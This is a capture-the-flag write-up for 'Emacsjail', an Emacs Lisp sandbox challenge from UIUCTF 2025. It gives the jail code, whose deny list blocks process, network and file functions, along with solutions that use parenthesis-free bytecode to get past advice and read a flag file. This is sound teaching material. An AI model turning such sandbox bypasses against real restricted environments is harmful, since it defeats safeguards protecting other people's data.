<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://feyor.sh/writeups/emacsjail/">Original</a>
    <h1>Emacsjail</h1>
    
    <div id="readability-page-1" class="page"><div id="main-content">




<content>
  <p><strong>Emacsjail</strong> was an Emacs Lisp jail challenge I wrote for UIUCTF 2025.
There were 17 solves during the competition, some of which were quite creative!</p>
<h2 id="description">Description</h2>
<blockquote>
<p>Mom, can we have SBCL?</p>
<p>No, we have SBCL at home.</p>
<p>SBCL at home:</p>
</blockquote>





<details open="">
  <summary>Emacs Lisp</summary>
  <div><pre tabindex="0"><code data-lang="elisp"><span><span><span>;;; -*- lexical-binding:t -*-</span>
</span></span><span><span>
</span></span><span><span><span>(</span><span>defun</span> <span>check</span> <span>(</span><span>input</span><span>)</span>
</span></span><span><span>  <span>(</span><span>not</span> <span>(</span><span>string-match-p</span> <span>&#34;.*(.*).*&#34;</span> <span>input</span><span>)))</span>
</span></span><span><span>
</span></span><span><span><span>(</span><span>defun</span> <span>panic</span> <span>(</span><span>str</span> <span>&amp;rest</span> <span>fmt</span><span>)</span>
</span></span><span><span>  <span>(</span><span>message</span> <span>str</span> <span>fmt</span><span>)</span>
</span></span><span><span>  <span>(</span><span>kill-emacs</span><span>))</span>
</span></span><span><span>
</span></span><span><span><span>(</span><span>let*</span> <span>((</span><span>input</span> <span>(</span><span>read-string</span> <span>&#34;Input: &#34;</span><span>))</span>
</span></span><span><span>       <span>(</span><span>code</span> <span>(</span><span>if</span> <span>(</span><span>check</span> <span>input</span><span>)</span>
</span></span><span><span>                 <span>(</span><span>car</span> <span>(</span><span>read-from-string</span> <span>input</span><span>))</span>
</span></span><span><span>            <span>(</span><span>panic</span> <span>&#34;no eval for you&#34;</span><span>))))</span>
</span></span><span><span>  <span>(</span><span>find-file-noselect</span> <span>&#34;./flag.txt&#34;</span><span>)</span>
</span></span><span><span>  <span>(</span><span>mapcar</span>
</span></span><span><span>   <span>(</span><span>lambda</span> <span>(</span><span>sym</span><span>)</span>
</span></span><span><span>       <span>(</span><span>advice-add</span> <span>sym</span> <span>:before</span> <span>(</span><span>lambda</span> <span>(</span><span>&amp;rest</span> <span>_</span><span>)</span> <span>(</span><span>panic</span> <span>&#34;no functional programming allowed: %s&#34;</span> <span>(</span><span>symbol-name</span> <span>sym</span><span>)))))</span>
</span></span><span><span>   <span>&#39;</span><span>(</span><span>buffer-size</span> <span>following-char</span> <span>preceding-char</span> <span>char-after</span> <span>char-before</span>
</span></span><span><span>     <span>buffer-string</span> <span>buffer-substring</span> <span>buffer-substring-no-properties</span> <span>compare-buffer-substrings</span> <span>subst-char-in-region</span> <span>delete-and-extract-region</span>
</span></span><span><span>     <span>call-process</span> <span>call-process-region</span> <span>getenv-internal</span>
</span></span><span><span>     <span>find-file-name-handler</span>
</span></span><span><span>     <span>copy-file</span> <span>rename-file</span> <span>add-name-to-file</span> <span>make-symbolic-link</span> <span>access-file</span> <span>insert-file-contents</span><span>))</span>
</span></span><span><span>  <span>(</span><span>unless</span> <span>(</span><span>functionp</span> <span>code</span><span>)</span> <span>(</span><span>panic</span> <span>&#34;only functional programming allowed&#34;</span><span>))</span>
</span></span><span><span>  <span>(</span><span>message</span> <span>(</span><span>funcall</span> <span>code</span><span>))</span>
</span></span><span><span>  <span>(</span><span>kill-emacs</span><span>))</span></span></span></code></pre></div>
</details>






<details open="">
  <summary>Diff</summary>
  <div><pre tabindex="0"><code data-lang="diff"><span><span>Bonus round: revengeance
</span></span><span><span><span>--- a/challenge.el
</span></span></span><span><span><span></span><span>+++ b/challenge.el
</span></span></span><span><span><span></span><span>@@ -18,7 +18,9 @@
</span></span></span><span><span><span></span>    &#39;(buffer-size following-char preceding-char char-after char-before
</span></span><span><span>      buffer-string buffer-substring buffer-substring-no-properties compare-buffer-substrings subst-char-in-region delete-and-extract-region
</span></span><span><span>      call-process call-process-region getenv-internal
</span></span><span><span><span>+     set-process-plist make-process make-pipe-process make-serial-process make-network-process
</span></span></span><span><span><span></span>      find-file-name-handler
</span></span><span><span><span>+     set-buffer get-buffer get-buffer-create get-file-buffer get-truename-buffer other-buffer find-buffer buffer-local-value buffer-local-variables buffer-swap-text make-overlay
</span></span></span><span><span><span></span>      copy-file rename-file add-name-to-file make-symbolic-link access-file insert-file-contents))
</span></span><span><span>   (unless (functionp code) (panic &#34;only functional programming allowed&#34;))
</span></span><span><span>   (message (funcall code))
</span></span></code></pre></div>
</details>
<h2 id="solution">Solution</h2>
<p>So we’re writing Lisp code without parens… a little cursed, but ok.
The first insight is that the read syntax for <a href="https://www.gnu.org/software/emacs/manual/html_node/elisp/Closure-Type.html" title="Emacs Lisp: (info &#34;(elisp) Closure Type&#34;)">closures</a> doesn’t (necessarily) use any parentheses if we use bytecode.</p>





<details open="">
  <summary>Emacs Lisp</summary>
  <div><pre tabindex="0"><code data-lang="elisp"><span><span><span>(</span><span>format</span> <span>&#34;%s (%s check)\n%s (%s check)&#34;</span>
</span></span><span><span>        <span>(</span><span>lambda</span> <span>nil</span><span>)</span> <span>(</span><span>if</span> <span>(</span><span>check</span> <span>(</span><span>prin1-to-string</span> <span>(</span><span>lambda</span> <span>nil</span><span>)))</span> <span>&#34;passes&#34;</span> <span>&#34;fails&#34;</span><span>)</span>
</span></span><span><span>        <span>(</span><span>byte-compile</span> <span>(</span><span>lambda</span> <span>nil</span><span>))</span> <span>(</span><span>if</span> <span>(</span><span>check</span> <span>(</span><span>prin1-to-string</span> <span>(</span><span>byte-compile</span> <span>(</span><span>lambda</span> <span>nil</span><span>))))</span> <span>&#34;passes&#34;</span> <span>&#34;fails&#34;</span><span>))</span></span></span></code></pre></div>
</details>





<div><pre tabindex="0"><code data-lang="text"><span><span>&#34;#[nil (nil) (t)] (fails check)
</span></span><span><span>#[0 \\300\\207 [nil] 1] (passes check)&#34;</span></span></code></pre></div>
<p>The second insight is that Emacs advice does not apply to functions which have dedicated opcodes in the Emacs Lisp bytecode interpreter.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>
Naturally, this behaviour is documented in the Emacs manual.</p>
<blockquote>
<p>It is possible to advise a primitive (see <a href="https://www.gnu.org/software/emacs/manual/html_node/elisp/What-Is-a-Function.html" title="Emacs Lisp: (info &#34;(elisp) What Is a Function&#34;)">What Is a Function?</a>), but one should typically not do so, for two reasons. Firstly, some primitives are used by the advice mechanism, and advising them could cause an infinite recursion. Secondly, many primitives are called directly from C, and such calls ignore advice; hence, one ends up in a confusing situation where some calls (occurring from Lisp code) obey the advice and other calls (from C code) do not.</p>
</blockquote>
<p>There are two such functions, <kbd>set-buffer</kbd> and <kbd>buffer-substring</kbd>, that allow us to extricate the flag.</p>





<details open="">
  <summary>Emacs Lisp</summary>
  <div><pre tabindex="0"><code data-lang="elisp"><span><span><span>(</span><span>defun</span> <span>disass</span> <span>(</span><span>form</span><span>)</span>
</span></span><span><span>  <span>(</span><span>with-temp-buffer</span>
</span></span><span><span>    <span>(</span><span>disassemble</span> <span>(</span><span>byte-compile</span> <span>form</span><span>)</span> <span>(</span><span>current-buffer</span><span>))</span>
</span></span><span><span>    <span>(</span><span>buffer-string</span><span>)))</span>
</span></span><span><span>
</span></span><span><span><span>(</span><span>disass</span> <span>(</span><span>lambda</span> <span>()</span> <span>(</span><span>set-buffer</span> <span>&#34;*flag.txt*&#34;</span><span>)</span> <span>(</span><span>buffer-substring</span> <span>(</span><span>point-min</span><span>)</span> <span>(</span><span>point-max</span><span>))))</span></span></span></code></pre></div>
</details>





<div><pre tabindex="0"><code data-lang="text"><span><span>&#34;byte code:
</span></span><span><span>  args: nil
</span></span><span><span>0       constant  \&#34;*flag.txt*\&#34;
</span></span><span><span>1       set-buffer
</span></span><span><span>2       discard
</span></span><span><span>3       point-min
</span></span><span><span>4       point-max
</span></span><span><span>5       buffer-substring
</span></span><span><span>6       return
</span></span><span><span>&#34;</span></span></code></pre></div>
<p>(Note that <kbd>byte-compile</kbd> can behave strangely depending on your Emacs version and you might have to write the bytecode by hand, in which case the <a href="https://rocky.github.io/elisp-bytecode.pdf">Emacs Lisp Bytecode Reference Manual</a> is very useful.)</p>
<p>At least, that was the intended solve: as it turns out, I forgot to advise <a href="#code-snippet--emacsjail-revenge">quite a few functions</a>.
Take for example the following solution:</p>





<details open="">
  <summary>Emacs Lisp</summary>
  <div><pre tabindex="0"><code data-lang="elisp"><span><span><span>(</span><span>disass</span> <span>(</span><span>car</span> <span>(</span><span>read-from-string</span> <span>&#34;#[0 \&#34;\\300\\301!\\210\\305\\302\\303 \\304 \\\&#34;!\\207\&#34; [set-buffer \&#34;flag.txt\&#34; filter-buffer-substring point-min point-max message] 3]&#34;</span><span>)))</span></span></span></code></pre></div>
</details>





<div><pre tabindex="0"><code data-lang="text"><span><span>&#34;byte code:
</span></span><span><span>  args: nil
</span></span><span><span>0       constant  set-buffer
</span></span><span><span>1       constant  \&#34;flag.txt\&#34;
</span></span><span><span>2       call      1
</span></span><span><span>3       discard
</span></span><span><span>4       constant  message
</span></span><span><span>5       constant  filter-buffer-substring
</span></span><span><span>6       constant  point-min
</span></span><span><span>7       call      0
</span></span><span><span>8       constant  point-max
</span></span><span><span>9       call      0
</span></span><span><span>10      call      2
</span></span><span><span>11      call      1
</span></span><span><span>12      return
</span></span><span><span>&#34;</span></span></code></pre></div>


</content>


  </div></div>
  </body>
</html>
